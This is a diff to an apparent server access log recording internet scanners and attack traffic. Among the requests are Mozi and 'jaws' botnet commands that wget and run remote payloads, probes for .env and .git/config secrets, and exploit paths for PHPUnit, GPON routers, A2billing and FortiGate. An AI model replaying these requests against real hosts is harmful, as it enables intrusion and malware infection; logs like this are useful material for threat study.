@@ -216,7 +216,6 @@
 [2022-01-29T21:18:56.171Z] "GET /.env HTTP/1.1" 301 - 0 0 0 - 20.115.32.123 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" ? ?IP? -
 [2022-01-29T21:53:09.388Z] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://119.139.33.158:49655/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 426 - 0 0 0 - - - - - -
 [2022-01-29T22:08:00.768Z] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 301 - 0 0 0 - 192.241.199.24 "Mozilla/5.0 zgrab/0.x" ? ?IP? -
-[2022-01-29T23:26:43.356Z] "HEAD / HTTP/1.0" 426 - 0 0 0 - - "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)" - ?IP? -
 [2022-01-29T23:59:01.573Z] "GET / HTTP/1.1" 301 - 0 0 0 - 45.83.66.131 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" ? ?IP? -
 [2022-01-29T23:59:57.272Z] "GET /.git/config HTTP/1.1" 301 - 0 0 0 - 45.33.15.172 python-requests/2.9.1 ? ?IP? -
 [2022-01-30T04:08:04.053Z] "GET / HTTP/1.1" 301 - 0 0 0 - 180.242.128.248 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" ? ?:? -
@@ -3933,3 +3932,134 @@
 [2022-03-05T14:17:04.246Z] "- - HTTP/1.1" 400 DPE 0 11 0 - --80.94.93.3++ - - - -
 [2022-03-05T14:17:31.500Z] "GET / HTTP/1.1" 301 - 0 0 0 - 168.232.12.126 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" ? ?:80 -
 [2022-03-05T14:36:02.431Z] "GET / HTTP/1.1" 301 - 0 0 0 - 13.66.38.74 python-requests/2.27.1 ? voice.dt-bd.com -
+[2022-03-05T17:22:41.951Z] "GET /.env HTTP/1.1" 301 - 0 0 0 - 52.170.6.30 "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30" ? ?IP? -
+[2022-03-05T17:22:43.262Z] "POST / HTTP/1.1" 301 - 0 0 0 - 52.170.6.30 "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30" ? ?IP? -
+[2022-03-05T17:24:36.760Z] "HEAD / HTTP/1.0" 426 - 0 0 0 - --167.99.58.22++ "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)" - ?IP? -
+[2022-03-05T17:25:19.853Z] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 - 0 0 0 - 52.170.6.30 python-requests/2.25.1 ? ?IP? -
+[2022-03-05T17:27:35.822Z] "POST /GponForm/diag_Form?images/ HTTP/1.1" 301 - 0 0 0 - 221.1.224.133 "Hello, World" ? 127.0.0.1:80 -
+[2022-03-05T20:23:01.941Z] "POST /cgi-bin/index2.asp HTTP/1.1" 301 - 0 0 0 - 92.53.64.29 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.44" ? ?:80 -
+[2022-03-05T20:37:02.637Z] "GET / HTTP/1.1" 301 - 0 0 0 - 18.179.37.22 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36" ? ?IP? -
+[2022-03-05T20:43:39.074Z] "OPTIONS / HTTP/1.1" 301 - 0 0 0 - 156.146.50.188 "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36" ? ?IP? -
+[2022-03-05T20:45:31.205Z] "- - HTTP/1.1" 400 DPE 0 11 1 - --192.241.222.47++ - - - -
+[2022-03-05T20:57:14.580Z] "GET / HTTP/1.1" 301 - 0 0 0 - 174.83.81.107 - ? ?IP? -
+[2022-03-05T20:57:39.007Z] "GET / HTTP/1.1" 301 - 0 0 0 - 197.248.97.91 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" ? ?:80 -
+[2022-03-05T21:25:20.428Z] "GET /owa/auth/x.js HTTP/1.1" 301 - 0 0 0 - 192.241.221.133 "Mozilla/5.0 zgrab/0.x" ? ?IP? -
+[2022-03-05T21:30:00.321Z] "GET / HTTP/1.1" 301 - 0 0 0 - 20.106.252.78 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" ? voice.dt-bd.com -
+[2022-03-05T22:18:11.491Z] "GET / HTTP/1.1" 301 - 0 0 0 - 64.225.76.99 "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)" ? ?IP? -
+[2022-03-05T23:54:37.839Z] "GET /.env HTTP/1.1" 301 - 0 0 0 - 176.113.115.238 "Mozilla/5.0 zgrab/0.x" ? voice.dt-bd.com -
+[2022-03-05T23:54:38.250Z] "- - HTTP/1.1" 400 DPE 0 11 0 - --176.113.115.238++ - - - -
+[2022-03-06T01:51:56.540Z] "GET / HTTP/1.0" 426 - 0 0 0 - --196.202.209.127++ "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" - ?:80 -
+[2022-03-06T03:26:55.069Z] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://95.14.99.232:52787/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 426 - 0 0 0 - --95.14.99.232++ - - - -
+[2022-03-06T03:54:40.529Z] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 301 - 0 0 0 - 192.241.220.120 "Mozilla/5.0 zgrab/0.x" ? ?IP? -
+[2022-03-06T03:57:54.863Z] "GET /.git/config HTTP/1.1" 301 - 0 0 0 - 44.195.79.68 python-requests/2.22.0 ? ?IP? -
+[2022-03-06T04:31:44.940Z] "GET / HTTP/1.1" 400 - 0 0 107 - --14.4.62.35++ - - - -
+[2022-03-06T05:26:18.973Z] "GET / HTTP/1.0" 426 - 0 0 0 - --185.173.35.25++ "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com" - - -
+[2022-03-06T05:35:04.853Z] "GET / HTTP/1.0" 426 - 0 0 0 - --185.152.124.11++ - - ?IP? -
+[2022-03-06T06:07:31.617Z] "GET /.env HTTP/1.1" 301 - 0 0 0 - 116.203.194.11 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" ? ?IP? -
+[2022-03-06T06:07:32.027Z] "POST / HTTP/1.1" 301 - 0 0 0 - 116.203.194.11 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" ? ?IP? -
+[2022-03-06T07:08:37.761Z] "GET /.git/config HTTP/1.1" 301 - 0 0 0 - 20.106.90.39 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0" ? ?IP? -
+[2022-03-06T08:57:51.524Z] "GET / HTTP/1.1" 301 - 0 0 0 - 186.208.100.3 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" ? ?:80 -
+[2022-03-06T10:48:19.802Z] "GET /shell?cd+/tmp;rm+-rf+*;wget+0.0.0.0/jaws;sh+/tmp/jaws HTTP/1.1" 301 - 0 0 0 - 222.187.223.158 "Hello, world" ? 127.0.0.1:80 -
+[2022-03-06T11:07:11.668Z] "GET /actuator/health HTTP/1.1" 301 - 0 0 0 - 192.241.221.77 "Mozilla/5.0 zgrab/0.x" ? ?IP? -
+[2022-03-06T11:37:10.505Z] "GET /.env HTTP/1.1" 301 - 0 0 0 - 20.112.15.179 "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30" ? ?IP? -
+[2022-03-06T11:37:13.839Z] "POST / HTTP/1.1" 301 - 0 0 0 - 20.112.15.179 "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30" ? ?IP? -
+[2022-03-06T11:37:19.722Z] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 - 0 0 0 - 20.112.15.179 python-requests/2.27.1 ? ?IP? -
+[2022-03-06T12:18:54.887Z] "GET /actuator/health HTTP/1.1" 301 - 0 0 0 - 192.241.221.113 "Mozilla/5.0 zgrab/0.x" ? ?IP? -
+[2022-03-06T12:47:13.731Z] "GET / HTTP/1.1" 301 - 0 0 0 - 178.94.52.34 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" ? ?:80 -
+[2022-03-06T15:52:14.414Z] "GET /a2billing/admin/Public/A2B_entity_backup.php?form_action=add&path=/var/www/html/_asterisk/saed.txt HTTP/1.1" 301 - 0 0 0 - 172.105.42.100 "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:53.0) Gecko/20100101 Firefos/53.0" ? ?IP? -
+[2022-03-06T15:52:27.691Z] "GET /_asterisk/saed.txt HTTP/1.1" 301 - 0 0 0 - 172.105.42.100 "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:53.0) Gecko/20100101 Firefos/53.0" ? ?IP? -
+[2022-03-06T15:53:16.345Z] "GET /a2billing/admin/Public/A2B_entity_backup.php?form_action=add&path=/var/www/html/assets/saed.txt HTTP/1.1" 301 - 0 0 0 - 172.105.42.100 "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:53.0) Gecko/20100101 Firefos/53.0" ? ?IP? -
+[2022-03-06T15:53:31.870Z] "GET /assets/saed.txt HTTP/1.1" 301 - 0 0 0 - 172.105.42.100 "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:53.0) Gecko/20100101 Firefos/53.0" ? ?IP? -
+[2022-03-06T15:54:46.617Z] "GET /a2billing/admin/Public/A2B_entity_backup.php?form_action=add&path=/var/www/html/recordings/saed.txt HTTP/1.1" 301 - 0 0 0 - 172.105.42.100 "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:53.0) Gecko/20100101 Firefos/53.0" ? ?IP? -
+[2022-03-06T15:55:32.484Z] "GET /recordings/saed.txt HTTP/1.1" 301 - 0 0 0 - 172.105.42.100 "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:53.0) Gecko/20100101 Firefos/53.0" ? ?IP? -
+[2022-03-06T15:55:58.836Z] "GET /a2billing/admin/Public/A2B_entity_backup.php?form_action=add&path=/var/www/html/var/saed.txt HTTP/1.1" 301 - 0 0 0 - 172.105.42.100 "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:53.0) Gecko/20100101 Firefos/53.0" ? ?IP? -
+[2022-03-06T15:56:32.584Z] "GET /var/saed.txt HTTP/1.1" 301 - 0 0 0 - 172.105.42.100 "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:53.0) Gecko/20100101 Firefos/53.0" ? ?IP? -
+[2022-03-06T16:16:29.411Z] "GET / HTTP/1.1" 301 - 0 0 0 - 5.235.210.180 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" ? ?:80 -
+[2022-03-06T16:31:55.608Z] "- - HTTP/1.1" 400 DPE 0 11 0 - --148.153.204.115++ - - - -
+[2022-03-06T17:53:37.604Z] "- - HTTP/1.1" 400 DPE 0 11 0 - --46.21.241.19++ - - - -
+[2022-03-06T19:24:22.682Z] "GET / HTTP/1.1" 301 - 0 0 0 - 5.202.40.241 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" ? ?:80 -
+[2022-03-06T19:51:11.731Z] "GET /wp-login.php HTTP/1.1" 301 - 0 0 1 - 47.92.68.165 "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" ? voice.dt-bd.com -
+[2022-03-06T20:09:19.644Z] "GET / HTTP/1.1" 301 - 0 0 10 - 103.172.47.164 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" ? ?:80 -
+[2022-03-06T20:49:39.469Z] "- - HTTP/1.1" 400 DPE 0 11 0 - --192.241.220.227++ - - - -
+[2022-03-06T21:15:02.677Z] "GET /remote/fgt_lang?lang=/../../../..//////////dev/ HTTP/1.1" 301 - 0 0 0 - 45.134.144.143 "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-1160.59.1.el7.x86_64" ? ?IP? -
+[2022-03-06T21:23:56.980Z] "GET / HTTP/1.1" 301 - 0 0 0 - 45.176.43.226 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" ? ?:80 -
+[2022-03-06T22:11:10.345Z] "- - HTTP/1.1" 400 DPE 0 11 0 - --64.227.97.195++ - - - -
+[2022-03-06T22:48:36.272Z] "GET / HTTP/1.1" 301 - 0 0 0 - 167.94.146.59 - ? ?:443 -
+[2022-03-06T22:48:37.066Z] "GET / HTTP/1.1" 301 - 0 0 0 - 167.94.146.59 "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" ? ?IP? -
+[2022-03-06T23:50:06.320Z] "GET / HTTP/1.0" 426 - 0 0 0 - --106.75.27.111++ - - ?:80 -
+[2022-03-07T00:05:49.528Z] "GET /xmlrpc.php HTTP/1.1" 301 - 0 0 0 - 80.211.74.224 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6" ? ?IP? -
+[2022-03-07T00:10:41.195Z] "GET /xmlrpc.php HTTP/1.1" 301 - 0 0 0 - 199.249.170.125 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6" ? ?IP? -
+[2022-03-07T00:52:41.642Z] "GET /xmlrpc.php HTTP/1.1" 301 - 0 0 0 - 80.211.115.27 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6" ? ?IP? -
+[2022-03-07T01:05:39.149Z] "GET / HTTP/1.1" 301 - 0 0 0 - 138.204.132.227 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" ? ?:80 -
+[2022-03-07T01:34:55.521Z] "GET / HTTP/1.0" 426 - 0 0 0 - --78.188.91.168++ - - ?IP? -
+[2022-03-07T01:46:27.218Z] "GET / HTTP/1.1" 301 - 0 0 0 - 54.183.235.104 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" ? ?:443 -
+[2022-03-07T01:54:13.414Z] "POST /cgi-bin/index2.asp HTTP/1.1" 301 - 0 0 0 - 91.213.50.2 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.44" ? ?:80 -
+[2022-03-07T02:18:38.064Z] "HEAD / HTTP/2" 301 - 0 0 1 - 51.159.102.248 curl/7.68.0 ? ?IP? -
+[2022-03-07T02:19:48.615Z] "GET /xmlrpc.php HTTP/1.1" 301 - 0 0 0 - 212.237.21.221 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6" ? ?IP? -
+[2022-03-07T02:30:36.695Z] "GET /vod_installer/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:37.204Z] "GET /login/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:37.732Z] "GET /apps/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:38.269Z] "GET /docker/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:38.800Z] "GET /engine/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:39.328Z] "GET /vue/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:39.845Z] "GET /development/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:40.373Z] "GET /system/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:40.894Z] "GET /admin/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:41.421Z] "GET /deployment/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:41.969Z] "GET /app/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:42.521Z] "GET /backend/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:43.082Z] "GET /dependencies/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:43.614Z] "GET /laravel/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:44.137Z] "GET /auth/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:44.650Z] "GET /personal/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:45.180Z] "GET /framework/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:45.705Z] "GET /cp/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:46.229Z] "GET /shared/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:46.785Z] "GET /server/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:47.433Z] "GET /local/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:48.423Z] "GET /private/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:49.131Z] "GET /web/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:49.762Z] "GET /search/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:50.620Z] "GET /document/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:51.930Z] "GET /src/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:53.053Z] "GET /master/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:53.699Z] "GET /application/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:54.371Z] "GET /frontend/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:55.182Z] "GET /project/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:55.886Z] "GET /rest/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:57.029Z] "GET /protected/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:57.629Z] "GET /dev/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:58.537Z] "GET /site/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:30:59.462Z] "GET /back/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:31:00.516Z] "GET /api/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:31:01.145Z] "GET /laravel-artisa/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:31:01.687Z] "GET /config/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:31:02.436Z] "GET /cli/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T02:31:03.490Z] "GET /core/.env HTTP/1.1" 301 - 0 0 0 - 54.234.31.148 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-07T03:36:10.588Z] "GET / HTTP/1.1" 301 - 0 0 0 - 54.218.113.9 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" ? ?IP? -
+[2022-03-07T03:55:30.288Z] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 301 - 0 0 0 - 192.241.222.48 "Mozilla/5.0 zgrab/0.x" ? ?IP? -
+[2022-03-07T04:50:21.272Z] "GET / HTTP/1.1" 301 - 0 0 0 - 178.130.156.48 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" ? ?:80 -
+[2022-03-07T04:50:21.309Z] "GET / HTTP/1.1" 301 - 0 0 0 - 178.130.156.48 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" ? ?:80 -
+[2022-03-07T06:25:12.007Z] "GET / HTTP/1.1" 301 - 0 0 0 - 187.149.71.138 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" ? ?:80 -
+[2022-03-07T06:45:53.015Z] "GET /xmlrpc.php HTTP/1.1" 301 - 0 0 1 - 164.90.205.178 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6" ? ?IP? -
+[2022-03-07T08:26:05.842Z] "GET / HTTP/1.1" 301 - 0 0 0 - 64.225.72.42 "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)" ? ?IP? -
+[2022-03-07T08:44:12.903Z] "GET /.env HTTP/1.1" 301 - 0 0 0 - 197.184.183.71 "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30" ? ?IP? -
+[2022-03-07T08:44:14.362Z] "POST / HTTP/1.1" 301 - 0 0 0 - 197.184.183.71 "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30" ? ?IP? -
+[2022-03-07T10:17:51.746Z] "GET /config/getuser?index=0 HTTP/1.1" 301 - 0 0 0 - 31.210.20.173 "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0" ? ?:80 -
+[2022-03-07T10:41:19.024Z] "GET / HTTP/1.1" 301 - 0 0 258 - 220.191.4.21 - ? ?IP? -
